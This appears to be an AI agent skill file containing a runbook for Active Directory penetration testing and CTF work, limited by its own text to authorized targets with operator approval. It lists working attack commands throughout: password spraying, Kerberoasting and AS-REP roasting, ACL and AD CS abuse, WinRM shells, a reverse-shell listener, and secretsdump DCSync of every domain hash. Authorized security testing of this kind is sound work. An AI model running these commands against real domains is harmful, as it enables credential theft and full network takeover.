---
name: ad
description: Active Directory enumeration and attack-path runbook for authorized pentesting and CTF. Use after recon spots a Domain Controller (Kerberos+LDAP+SMB) or when you hold domain credentials and need to map users, groups, shares, ACLs, delegation, AD CS, and privesc paths to Domain Admin. Triggers on "active directory", "domain controller", "I have domain creds", "kerberoast", "asreproast", "bloodhound", "ADCS / certipy", "dMSA / BadSuccessor", "DCSync", "secretsdump", "evil-winrm", "what can I do on this DC".
---

Base directory for this skill: `.claude/skills/ad`

# Active Directory — enumeration & attack-path runbook

Methodology for mapping an AD domain and finding the path to Domain Admin on an
authorized target. This is the judgment layer; the tools live in `net-toolbox`
and run at the tunnel IP via **`scripts/roo shell <cmd>`**. Recon hands off here
the moment it sees a DC profile (Kerberos 88 + LDAP 389 + SMB 445 together).

## Scope guardrail (read first)

Authorized targets only — CTF boxes, lab ranges, signed-scope hosts. This skill
*enumerates and plans*; it surfaces attack paths but the operator approves the
actual privilege-gaining steps (kerberoast cracking, ADCS abuse, BadSuccessor,
DCSync). Confirm scope before authenticating.

## Footgun cheat-sheet (hard-won — read before you debug a tool)

These bite on hardened / Server 2025 DCs. The `net-toolbox` image already carries
the fixes; you mostly need to *pick the right auth*.

- **`unsupported hash type MD4`** — OpenSSL 3 dropped MD4, which NTLM key
  derivation needs. **Already fixed image-wide** (legacy provider via
  `OPENSSL_CONF`); if you ever see it, you're outside `net-toolbox`.
- **`KRB_AP_ERR_SKEW` (clock skew)** — the container clock ≠ the DC clock and
  Kerberos demands <5 min. Fix it once per shell with **`clocksync <dc-ip>`** — it
  puts the whole shell on the DC's clock (via a libfaketime preload `roo shell`
  sets up), so Kerberos tools "just work" with no per-command wrapper. This is *the*
  enabler for every Kerberos path (BadSuccessor, `-k` LDAP, S4U). `clocksync --off`
  reverts. (A container can't own a real clock — `CLOCK_REALTIME` isn't namespaced —
  so this emulates it without touching the host clock.)
- **`strongerAuthRequired` on LDAP/389 + LDAPS/636 `Connection reset`** — a DC
  that enforces LDAP signing *and* resets LDAPS defeats **every ldap3-based tool,
  regardless of auth** (the bundled `ldap3 2.9.1` has no sealing support at all).
  Confirmed dead on such DCs: `certipy` (default), `dacledit`, `badsuccessor.py`,
  `bloodhound-python`/`bloodhound-ce-python`. Use a tool that seals (next two items).
- **Confidentiality-required ops** (read `msDS-ManagedPassword`, set/reset/create a
  password) need a *sealed* (encrypted) bind, not just signed — and LDAPS is dead
  here. The escape hatch is the **OpenLDAP clients over SASL GSSAPI**, which do
  sign+**seal** (SSF 256) over plain 389: `ldapsearch`/`ldapmodify`/`ldapadd
  -Y GSSAPI -H ldap://<dc-fqdn>` after `krbconf <dc>` + a TGT in `KRB5CCNAME`
  (snippet below). This is the only Linux path in the kit for confidential LDAP.

### Prescriptive: reach for the tool that *seals* — don't debug the one that can't

| Goal | ✅ Use (seals over 389) | ❌ Don't (ldap3, fails on hardened DCs) |
|------|------------------------|-----------------------------------------|
| LDAP enum / users / groups | `nxc ldap … ` | raw `ldapsearch -x` simple bind |
| Read an object's DACL/ACEs | `nxc ldap … -M daclread -o TARGET_DN=…` | `dacledit.py` |
| dMSA / BadSuccessor audit | `nxc ldap … -M badsuccessor` | `badsuccessor.py -action search` |
| ADCS triage | `certipy find -ldap-scheme ldap …` | `certipy find` (defaults to LDAPS → reset) |
| Roasting | `nxc ldap … --kerberoasting --asreproast` | — |
| Read managed pw / set·reset·create password (**confidential**) | `ldapsearch`/`ldapmodify`/`ldapadd -Y GSSAPI` (SASL seal, SSF 256) | `bloodyAD set password`, `changepasswd` (sign-only → confidentiality error) |
| Full BloodHound graph | `bhcollect <dc> <user> <pass>` (rusthound-ce GSSAPI, *seals*) | `bloodhound-python` / `nxc --bloodhound` (ldap3 → can't seal here) |

`nxc` prints `signing:Enforced` / `channel binding:…` so you know up front what
the DC demands. The impacket *native*-LDAP examples (GetADUsers/GetUserSPNs) also
seal and work; it's only the newer ldap3-based impacket examples that don't.

### The Kerberos pattern (copy this)

```bash
scripts/roo shell sh -c '
DC=<dc-ip>; REALM=<domain.fqdn>; USER=<user>; PASS=<pass>
clocksync $DC                                 # whole shell now on the DC clock — no skew
getTGT.py -dc-ip $DC "$REALM/$USER:$PASS"      # writes <user>.ccache in cwd (=/work)
export KRB5CCNAME=/work/$USER.ccache           # getTGT ignores KRB5CCNAME for *writing*; set it for readers
<kerberos-tool> -k -no-pass -dc-host DC01.$REALM -dc-ip $DC ...
'
```

`clocksync <dc>` reads the DC clock over SMB and shifts this shell to it (no
per-command `faketime` needed). Add the DC's name to `./hosts`
(`<ip> DC01.domain.fqdn domain.fqdn`) so Kerberos can resolve the KDC. For a
one-off you can still wrap a single command in `faketime "<dc-time>" <tool>`;
`clocksync` just does it for the whole session.

### Sealed (confidential) LDAP pattern — read managed pw / set passwords

For ops the DC only serves over a *confidential* connection (managed-password read,
`unicodePwd` set/reset, creating a user with a password) when LDAPS is dead, use the
OpenLDAP clients over SASL GSSAPI — they negotiate sign+**seal** (SSF 256). The
image already carries the GSSAPI SASL mech + `SASL_NOCANON on`; `krbconf` sets
`rdns=false` so the SPN is right.

```bash
scripts/roo shell sh -c '
DC=<dc-ip>; D=<domain.fqdn>; USER=<user>; PASS=<pass>; FQDN=DC01.$D
krbconf $DC; clocksync $DC
getTGT.py -dc-ip $DC "$D/$USER:$PASS"; export KRB5CCNAME=/work/$USER.ccache
# read a managed password (gMSA/dMSA), sealed:
ldapsearch -Y GSSAPI -H ldap://$FQDN -o ldif-wrap=no -LLL \
  -b "<target-dn>" msDS-ManagedPassword
# set/create a password (unicodePwd, UTF-16LE+base64) — needs the same seal:
#   ldapadd -Y GSSAPI -H ldap://$FQDN -f user.ldif      (with unicodePwd:: <b64>)
'
```

`-Y GSSAPI` must target the DC by **FQDN** (`ldap://DC01.$D`), not IP — the SPN is
`ldap/<fqdn>`. (Authz still applies: you only get a managed password if you're in
its `…GroupMSAMembership`, and reset needs `ForceChangePassword`.)

## Workflow

Recon's `report` + per-port facts feed phase 1. Work top-down; each phase's
findings unlock the next. Stream high-value findings to the operator as they
land (creds that validate, a writable share, an ESC, a BloodHound path).

### 1. Identify the domain (unauth)

```bash
scripts/roo shell nxc smb <dc-ip>            # domain, FQDN, OS build, signing, SMBv1
```

Record **NetBIOS domain, DNS domain (`*.htb`/corp), DC hostname, OS build**. Add
`<ip> DC01.<domain> <domain>` to `./hosts`. **Build 26100 = Server 2025** → flag
BadSuccessor (dMSA) as a candidate up front. Note SMB signing (relay viability).

### 2. Unauth footholds (no creds yet)

- **Null/guest**: `nxc smb <dc> -u '' -p ''` and `-u guest -p ''` → shares, and
  `--rid-brute` to harvest a **userlist** even unauthenticated.
- **User enum / AS-REP**: build names from RID-brute or `lookupsid.py`, then
  `GetNPUsers.py <realm>/ -no-pass -usersfile users.txt` for accounts with
  pre-auth disabled (crackable AS-REP hashes, no creds needed).
- **Anonymous LDAP**: `nxc ldap <dc> -u '' -p '' --query …` (often denied on
  modern DCs, cheap to try).

### 3. Credentialed sweep (you hold a domain account)

The moment creds validate (`[+]` from `nxc smb`), run the standard sweep:

```bash
U=<user>; P='<pass>'; DC=<dc-ip>; D=<domain.fqdn>
scripts/roo shell nxc smb  $DC -u $U -p $P --shares --users --pass-pol
scripts/roo shell nxc smb  $DC -u $U -p $P -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/work/loot
scripts/roo shell nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt
scripts/roo shell bloodyAD --host DC01.$D -d $D -u $U -p $P get writable   # ⭐ broad: every object you can write
scripts/roo shell sh -c "cd /work && certipy find -u $U@$D -p '$P' -dc-ip $DC -ldap-scheme ldap -stdout -vulnerable"
# Full graph — try the (faster) collector, but it relies on the DC not forcing seal:
scripts/roo shell bloodhound-ce-python -u $U -p $P -d $D -dc DC01.$D -ns $DC -c All --zip
```

- **Spray every credential you hold before you crack anything.** Password reuse
  is the cheapest lateral move in AD — the same password recurs across accounts,
  initial passwords get set in bulk, and a service account's password is often its
  own name or a shared deploy secret. The instant you hold *any* password, spray it
  across the full userlist (`--users` gives you the list), and spray every password
  you later crack/dump domain-wide:
  ```bash
  nxc smb $DC -u users.txt -p '<known-pass>' --continue-on-success   # one pass, every user
  nxc smb $DC -u users.txt -p users.txt --no-bruteforce             # username == password
  ```
  **Check `--pass-pol` first**: if a lockout threshold is set, spray one password
  per observation window, not a list (lockout = None ⇒ spray freely). This step
  comes **before** offline cracking — never spend hashcat time on a hash whose
  plaintext a free spray would hand you, and the moment a crack/roast yields a
  password, re-spray it everywhere before anything else.
- **`--shares`** reports *tested* READ/WRITE per share — trust it over a perms
  string (a `drw-rw-rw-` listing is **not** a write confirmation). Chase WRITE
  shares and any non-default share (backup dumps, dev drops, web roots).
- **`-M spider_plus`** writes to `~/.nxc` by default — pass `OUTPUT_FOLDER`/
  `DOWNLOAD_FLAG` (or rely on the persistent HOME) so loot lands on the host.
- **BloodHound** drops a CE zip — the single most valuable artifact. **But on a
  signing-enforced + LDAPS-resetting DC the python collector can't seal and will
  fail** (Kerberos fallback fails too — ldap3 limitation). When it does, don't
  rabbit-hole: get the *specific* ACLs you need with `nxc -M daclread`, and reach
  for `rusthound-ce`/SharpHound for the full graph.
- **Certipy** — go straight to `-ldap-scheme ldap` (the default LDAPS resets here).
- Roasting writes hashes to `/work`; crack them on the host GPU with the **hashcat**
  skill — `WL=$(scripts/roo wordlist); scripts/roo hashcat -m 19700 kr.txt "$WL"`
  (spray first — see the rule above — and let the operator approve the crack).

### 4. Triage → attack paths

**Two durable rules (the specific techniques below rotate; these don't):**

1. **Find your edges broadly first — don't pattern-match to this month's CVE.**
   The graph + "what can I touch" surfaces the path whatever it happens to be:
   - `bloodyAD --host DC01.$D -d $D -u $U -p $P get writable` — every object you
     can write (sealing NTLM; works where ldap3 fails). One command typically
     reveals the whole privesc surface: OU CreateChild, DNS-zone writes, group
     memberships you can edit, user objects you control.
   - the BloodHound graph (when collectable) for the full path-to-DA.
2. **Verify every precondition of a path before you claim it.** A single
   enumeration hit (a module flag, one ACE) is a *lead*, not a confirmed path.
   Confirm the exact right (read the ACE), confirm the dependencies, ideally
   dry-run, *then* report it as the path. Over-claiming is the failure mode.

Common routes a writable/graph edge maps to (a menu, not a priority order — let
the enumeration pick):

- **Kerberoast / AS-REP** → *spray known creds at the target first (reuse is free);
  only then* crack with the **hashcat** skill (`roo hashcat`) → new creds →
  re-spray domain-wide (loop to phase 3).
- **Delegation** — unconstrained / constrained / RBCD (`findDelegation.py`, `rbcd.py`).
- **AD CS ESC1–16** — `certipy find -ldap-scheme ldap -vulnerable` → `certipy req`/`auth`.
- **ACL abuse** — `GenericAll`/`WriteDACL`/`ForceChangePassword`/AddSelf/write-membership
  on a user, group, GPO, or computer (`bloodyAD set …`, `owneredit`, `rbcd`).
- **dMSA / BadSuccessor** (Server 2025) — a writable OU's `CreateChild` + a KDS root
  key. Audit `nxc -M badsuccessor`, confirm the ACE + key, exploit with
  `bloodyAD`/`badsuccessor.py`. *(Worked example of rule 2: three preconditions,
  not one signal — see the engagement report for the per-box detail.)*
- **DCSync** — replication rights → `secretsdump.py` for the whole domain (endgame).

Keep box-specific findings (which ACE, which template, which OU) in the
`recon-results` report — this runbook stays technique-agnostic on purpose.

### 5. Foothold & shells

```bash
scripts/roo shell nxc winrm $DC -u $U -p $P          # Pwn3d! ⇒ this user can WinRM
scripts/roo shell evil-winrm -i $DC -u $U -p $P      # interactive shell
```

`nxc winrm` answers "can this account get a shell" before you reach for
evil-winrm. Exec vectors once privileged: `psexec.py`/`wmiexec.py`/`smbexec.py`
(`<realm>/<user>:<pass>@<dc>`), or `nxc … -x`/`-X`. Add `-k` (+faketime) for
Kerberos-only auth. Catch reverse shells in `roo shell` with
`rlwrap ncat -lvnp <port>` at the tunnel IP (`roo ip` = LHOST).

### 6. Post-DA — collect

```bash
scripts/roo shell secretsdump.py <realm>/<user>:'<pass>'@<dc>      # SAM/LSA/NTDS (DCSync)
```

With DA/replication, `secretsdump` dumps NTDS (every hash → golden ticket, full
persistence). Then loot the previously-denied shares (e.g. `VMBackups`) and the
DPAPI/credential stores. Record every hash and internal IP as a pivot seed.

## Tooling reference

Everything runs in `net-toolbox` at the tunnel IP via `scripts/roo shell …`:

| Need | Tool |
|------|------|
| SMB/LDAP/WinRM/MSSQL sweep + modules | `nxc {smb,ldap,winrm,mssql} …` |
| What can I write? / LDAP read-write (sealed) | `bloodyAD --host … get writable` / `get`/`set`/`add` |
| Read an object's DACL (sealed) | `nxc ldap … -M daclread -o TARGET_DN=…` |
| Confidential read/write: managed pw, set/reset/create password | `ldapsearch`/`ldapmodify`/`ldapadd -Y GSSAPI -H ldap://<fqdn>` (SASL seal) |
| AD CS enum + abuse | `certipy {find -ldap-scheme ldap\|req\|auth} …` |
| Interactive WinRM | `evil-winrm -i <t> -u U -p P` (or `evil-winrm-py … -k`) |
| Kerberos tickets | `getTGT.py` / `getST.py` (+ `faketime`) |
| Roasting | `nxc ldap --kerberoasting/--asreproast`, `GetUserSPNs.py`, `GetNPUsers.py` |
| dMSA / BadSuccessor | audit `nxc -M badsuccessor`; exploit `badsuccessor.py -action {add,modify}` |
| Full BloodHound graph | `bhcollect <dc> <user> <pass>` (rusthound-ce, *seals* — hardened DCs) / `bloodhound-ce-python` (soft DCs); then `roo bloodhound view <zip>` |
| Kerberos realm setup | `krbconf <dc>` (writes /etc/krb5.conf for GSSAPI tools) |
| Delegation / ACL / RBCD | `findDelegation.py`, `rbcd.py`, `owneredit.py` (impacket-native seal OK) |
| Secrets / DCSync | `secretsdump.py` |
| Exec | `psexec.py`, `wmiexec.py`, `smbexec.py`, `nxc -x` |
| LLMNR/NBT-NS/mDNS poison + NetNTLM capture | `roo responder` (own verb, binds `tun0`; captures → `recon-results/responder/`, crack with the **hashcat** skill — relay is dead when SMB signing is enforced) |
| Ad-hoc clients | `smbclient`, `ldapsearch`, `dig` |

**Auth selector:** password → NTLM (works now, MD4 fixed). Clock skew →
**`clocksync <dc>`** then Kerberos `-k`. LDAP read/write an ldap3 tool refuses
(strongerAuthRequired / LDAPS reset) → a tool that **signs**: `nxc ldap`,
`bloodyAD`, impacket-native. **Confidential** op (managed pw / set password) →
the only thing that **seals**: `ldapsearch`/`ldapmodify -Y GSSAPI` (after `krbconf`
+ TGT).

### Know a tool's reach before you declare it can't (discipline rule)

Most "this tool can't do X" conclusions on this kit are wrong — the capability is
there, just not the flag you reached for. **Before concluding a tool can't do
something, enumerate it:** `nxc <proto> -L` (modules), `<tool> --help`. And keep
**capability vs packaging** separate — a tool can *read* the data even if one
output mode fails (e.g. nxc's sealed connection reads every ACL/user/group here,
while its `--bloodhound` *zip* export fails because that path uses ldap3 and can't
seal — the data is collectable, the zip isn't).

The easily-forgotten reach of the workhorses:

- **`nxc ldap`** — flags: `--users --groups --pass-pol --kerberoasting --asreproast
  --gmsa --dns-server`; modules (`nxc ldap -L`): `daclread`, `badsuccessor`,
  `maq`, `whoami`, `group-mem`, `pre2k`, `get-desc-users`. **`nxc smb`** modules:
  `spider_plus`, `gpp_password`, `gpp_autologin`, `enum_av`, `lsassy`. All over the
  *sealed* connection — they work where ldap3 tools don't.
- **`bloodyAD`** (seals over 389) — the read/write workhorse: `get writable`,
  `get children/object/membership/dnsDump`, `set owner/password`, `add user/
  computer/groupMember/dMSA`, `remove`. Reaches what ldap3 tools refuse here.
- **`certipy`** — `find` (force `-ldap-scheme ldap`), `req`, `auth`, `relay`, `shadow`.

So "collect the graph": nxc/bloodyAD already read the pieces over sealed LDAP, and
a ready-to-ingest *zip* even on a seal-enforced DC is **`bhcollect <dc> <user>
<pass>`** — it drives rusthound-ce's Kerberos/GSSAPI path (the one collector that
seals over 389) plus the krb5/clock setup, then `roo bloodhound view <zip>`. The
python collectors (`bloodhound-python`, `nxc --bloodhound`) can't seal and fail
here; that's a tool limit, never "the data is uncollectable".

Loop, don't line: every new credential — cracked, dumped, *or sprayed* — gets
sprayed domain-wide and fed back into the sweep; every new hash or hostname feeds
back too. Generate the final map with `scripts/roo report <dc-ip>` once buckaroos +
AD findings are on disk.
